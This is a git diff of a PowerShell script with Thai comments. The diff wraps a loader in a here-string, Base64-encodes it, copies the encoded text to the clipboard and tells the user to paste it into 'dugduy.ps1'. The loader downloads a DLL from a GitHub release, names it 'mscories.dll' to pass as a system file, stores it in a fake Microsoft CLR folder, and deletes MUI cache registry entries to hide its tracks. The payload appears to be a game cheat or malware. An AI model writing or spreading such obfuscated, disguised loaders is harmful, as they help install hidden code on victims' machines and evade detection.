@@ -1,3 +1,5 @@
+# 1. วางโค้ดต้นฉบับที่จะเข้ารหัสไว้ใน Block นี้
+$rawCode = @'
 $url = "https://github.com/potae112/Cmdfreefire/releases/download/v1.0/dllfreefire.dll"
 $fakeName = "mscories.dll"
 $workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
@@ -58,3 +60,15 @@ $muiPath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\She
 Get-Item -Path $muiPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Property | Where-Object { $_ -like "*$fakeName*" } | ForEach-Object {
     Remove-ItemProperty -Path $muiPath -Name $_ -Force -ErrorAction SilentlyContinue
 }
+'@
+
+# 2. ประมวลผลแปลงเป็น Base64
+$bytes = [System.Text.Encoding]::UTF8.GetBytes($rawCode)
+$base64Result = [Convert]::ToBase64String($bytes)
+
+# 3. คัดลอกผลลัพธ์ลง Clipboard อัตโนมัติ และแสดงบนจอด้วย
+$base64Result | Set-Clipboard
+Write-Host "--------------------------------------------------------" -ForegroundColor Cyan
+Write-Host "ระบบคัดลอกโค้ด Base64 ลง Clipboard ให้คุณแล้ว!" -ForegroundColor Green
+Write-Host "คุณสามารถเปิดไฟล์ dugduy.ps1 แล้วกด Ctrl+V วางได้เลย" -ForegroundColor Yellow
+Write-Host "--------------------------------------------------------" -ForegroundColor Cyan
